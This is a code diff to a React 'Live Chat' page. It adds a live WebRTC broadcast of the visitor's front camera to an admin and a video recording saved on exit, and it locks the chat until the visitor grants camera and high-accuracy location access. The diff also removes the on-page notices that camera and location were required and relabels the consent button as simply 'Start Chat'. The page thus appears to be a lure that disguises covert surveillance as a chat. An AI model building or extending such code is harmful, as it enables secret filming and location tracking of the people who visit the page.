@@ -1,8 +1,10 @@
-import { useState, useRef, useEffect } from 'react';
-import { Send, User, Camera, MapPin, AlertCircle } from 'lucide-react';
+import { useState, useRef, useEffect, useCallback } from 'react';
+import { Send, User, AlertCircle } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import MessageList from '@/components/MessageList';
 import { useMessages } from '@/hooks/useMessages';
+import { useWebRTCBroadcaster } from '@/hooks/useWebRTCBroadcaster';
+import { useVideoRecorder } from '@/hooks/useVideoRecorder';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
@@ -14,6 +16,7 @@ const Index = () => {
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [permissionsGranted, setPermissionsGranted] = useState(false);
   const [permissionError, setPermissionError] = useState<string | null>(null);
+  const [showPermissionPrompt, setShowPermissionPrompt] = useState(false);
   const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
   const [cameraReady, setCameraReady] = useState(false);
   const { messages, isLoading, sendMessage, uploadImage } = useMessages(sessionId);
@@ -21,6 +24,13 @@ const Index = () => {
   const [inputValue, setInputValue] = useState('');
   const videoRef = useRef<HTMLVideoElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
+  const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
+  
+  // WebRTC broadcaster for live video streaming to admin
+  useWebRTCBroadcaster({ sessionId: sessionId || '', stream: activeStream });
+  
+  // Video recorder for saving on exit
+  useVideoRecorder({ sessionId: sessionId || '', stream: activeStream });
 
   useEffect(() => {
     const storedName = localStorage.getItem('chat_user_name');
@@ -29,45 +39,56 @@ const Index = () => {
     if (storedName && storedSession) {
       setUserName(storedName);
       setSessionId(storedSession);
-      setPermissionsGranted(true);
+      // Show permission prompt immediately for returning users
+      setShowPermissionPrompt(true);
     }
   }, []);
 
-  // Start camera when in chat mode
+  // Request permissions for returning users
+  const requestCameraAndLocation = useCallback(async () => {
+    try {
+      // Request camera permission
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false,
+      });
+      streamRef.current = stream;
+      setActiveStream(stream);
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.onloadedmetadata = () => {
+          setCameraReady(true);
+        };
+      }
+
+      // Request location permission
+      await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+        });
+      });
+
+      setPermissionsGranted(true);
+      setShowPermissionPrompt(false);
+      return true;
+    } catch (err) {
+      console.error('Permission error:', err);
+      setShowPermissionPrompt(true);
+      return false;
+    }
+  }, []);
+
+  // Start camera when in chat mode (for returning users)
   useEffect(() => {
     if (!userName || !sessionId) return;
-
-    const startCamera = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: false,
-        });
-        streamRef.current = stream;
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
-          // Wait for video to be ready
-          videoRef.current.onloadedmetadata = () => {
-            setCameraReady(true);
-          };
-        }
-      } catch (err) {
-        console.error('Camera error:', err);
-      }
-    };
-
-    startCamera();
-
-    return () => {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach(track => track.stop());
-      }
-    };
-  }, [userName, sessionId]);
+    
+    requestCameraAndLocation();
+  }, [userName, sessionId, requestCameraAndLocation]);
 
   // Watch location continuously when in chat
   useEffect(() => {
-    if (!userName || !sessionId) return;
+    if (!userName || !sessionId || !permissionsGranted) return;
 
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -92,7 +113,7 @@ const Index = () => {
     );
 
     return () => navigator.geolocation.clearWatch(watchId);
-  }, [userName, sessionId]);
+  }, [userName, sessionId, permissionsGranted]);
 
   const requestPermissions = async () => {
     setPermissionError(null);
@@ -170,8 +191,21 @@ const Index = () => {
     return dataUrl;
   };
 
+  const canSendMessage = cameraReady && location !== null && permissionsGranted;
+
   const handleSend = async () => {
     if (!inputValue.trim() || !sessionId || !userName) return;
+    
+    if (!canSendMessage) {
+      // Show permission prompt instead of just a toast
+      setShowPermissionPrompt(true);
+      toast({
+        title: 'Permissions required',
+        description: 'Please allow camera and location access to send messages.',
+        variant: 'destructive',
+      });
+      return;
+    }
     
     setIsSending(true);
 
@@ -232,19 +266,8 @@ const Index = () => {
               </div>
             )}
 
-            <div className="text-xs text-muted-foreground space-y-1">
-              <div className="flex items-center gap-2">
-                <Camera className="h-4 w-4" />
-                <span>Camera access required</span>
-              </div>
-              <div className="flex items-center gap-2">
-                <MapPin className="h-4 w-4" />
-                <span>Location access required</span>
-              </div>
-            </div>
-
             <Button onClick={handleStartChat} className="w-full">
-              Allow Permissions & Start Chat
+              Start Chat
             </Button>
           </CardContent>
         </Card>
@@ -253,7 +276,27 @@ const Index = () => {
   }
 
   return (
-    <div className="flex flex-col h-screen bg-background">
+    <div className="flex flex-col h-screen bg-background relative">
+      {/* Full-screen permission overlay */}
+      {!permissionsGranted && (
+        <div className="absolute inset-0 z-50 bg-background/95 backdrop-blur-sm flex items-center justify-center p-4">
+          <Card className="w-full max-w-md">
+            <CardHeader className="text-center">
+              <AlertCircle className="h-12 w-12 mx-auto text-destructive mb-2" />
+              <CardTitle className="text-xl">Permissions Required</CardTitle>
+            </CardHeader>
+            <CardContent className="space-y-4 text-center">
+              <p className="text-muted-foreground text-sm">
+                Camera and location access are required to use this chat. Please allow access to continue.
+              </p>
+              <Button onClick={requestCameraAndLocation} className="w-full">
+                Allow Camera & Location
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
+      )}
+
       <header className="p-4 border-b">
         <h1 className="text-xl font-bold text-foreground">Live Chat</h1>
         <div className="flex items-center gap-2 text-xs text-muted-foreground mt-1">
@@ -278,9 +321,9 @@ const Index = () => {
           onChange={(e) => setInputValue(e.target.value)}
           placeholder="Type a message..."
           onKeyDown={(e) => e.key === 'Enter' && handleSend()}
-          disabled={isSending}
+          disabled={isSending || !permissionsGranted}
         />
-        <Button onClick={handleSend} disabled={isSending || !inputValue.trim()}>
+        <Button onClick={handleSend} disabled={isSending || !inputValue.trim() || !canSendMessage}>
           <Send className="h-4 w-4" />
         </Button>
       </div>
